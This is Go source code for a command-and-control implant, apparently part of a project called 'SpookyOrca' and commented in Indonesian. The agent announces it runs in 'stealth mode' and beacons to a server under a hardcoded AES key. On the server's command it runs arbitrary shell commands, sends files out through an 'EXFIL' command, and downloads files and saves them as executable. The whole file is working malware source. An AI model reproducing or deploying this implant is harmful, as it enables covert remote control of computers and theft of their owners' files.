package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/google/uuid"
)

var agentID = uuid.New().String()

func startAgent() {
	fmt.Println("[+] Agent started in stealth mode")
	hostname, _ := os.Hostname()
	serverURL := "http://127.0.0.1:8080" // Sesuaikan alamat server
	encryptionKey := "SpookyOrcaC2AES1"  // Pastikan panjang key valid (16/24/32)

	for {
		// Ping ke server untuk mendapat command
		info := fmt.Sprintf("%s|%s", hostname, agentID)
		encryptedInfo, _ := encryptAES(info, encryptionKey)
		encodedInfo := url.QueryEscape(encryptedInfo)
		resp, err := http.Get(fmt.Sprintf("%s/ping?info=%s", serverURL, encodedInfo))

		if err != nil || (resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent) {
			time.Sleep(3 * time.Second)
			continue
		}

		commandBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		command, err := decryptAES(string(commandBytes), encryptionKey)
		if err == nil && command != "" {
			switch {
			case len(command) > 6 && command[:6] == "EXFIL|":
				// Exfil file
				filepath := command[6:]
				exfiltrateFile(filepath, serverURL, encryptionKey)

			case len(command) > 9 && command[:9] == "DOWNLOAD|":
				// Download file dari server
				filename := command[9:]
				downloadFile(filename, serverURL, encryptionKey)

			default:
				// Command OS biasa
				out, err := executeCommand(command)
				if err != nil {
					out = fmt.Sprintf("Error: %s", err.Error())
				}
				encryptedResult, _ := encryptAES(out, encryptionKey)

				// Kirim hasil command → /result dengan type=cmd
				http.Post(fmt.Sprintf("%s/result?id=%s&type=cmd", serverURL, agentID), "text/plain",
					bytes.NewBufferString(encryptedResult))
			}
		}
		time.Sleep(3 * time.Second)
	}
}

// executeCommand mengeksekusi perintah OS
func executeCommand(cmd string) (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/C", cmd).Output()
		return string(out), err
	} else {
		out, err := exec.Command("/bin/sh", "-c", cmd).Output()
		return string(out), err
	}
}

// exfiltrateFile membaca file lalu mengirim ke server (exfil) secara terenkripsi
func exfiltrateFile(filepath, serverURL, encryptionKey string) {
	fileData, err := os.ReadFile(filepath)
	if err != nil {
		fmt.Println("[-] Error reading file:", err)
		return
	}

	encodedData := base64.StdEncoding.EncodeToString(fileData)
	encryptedData, _ := encryptAES(encodedData, encryptionKey)

	// Kirim file (exfil) → /result dengan type=exfil
	resp, err := http.Post(fmt.Sprintf("%s/result?id=%s&type=exfil&filename=%s",
		serverURL, agentID, url.QueryEscape(filepath)), "text/plain", bytes.NewBufferString(encryptedData))
	if err != nil {
		fmt.Println("[-] Failed to exfiltrate file:", err)
		return
	}
	resp.Body.Close()
	fmt.Println("[+] File exfiltrated:", filepath)
}

// downloadFile memanggil endpoint /download di server, lalu menyimpan file di disk
func downloadFile(filename, serverURL, encryptionKey string) {
	downloadURL := fmt.Sprintf("%s/download?filename=%s", serverURL, url.QueryEscape(filename))
	resp, err := http.Get(downloadURL)
	if err != nil {
		fmt.Println("[-] Failed to download file:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("[-] Server returned status:", resp.Status)
		return
	}

	// Baca file
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("[-] Error reading downloaded file:", err)
		return
	}

	// Simpan di disk (nama file sama)
	localPath := filepath.Base(filename)
	err = os.WriteFile(localPath, data, 0755)
	if err != nil {
		fmt.Println("[-] Error saving file:", err)
		return
	}

	fmt.Println("[+] File downloaded and saved as:", localPath)
}
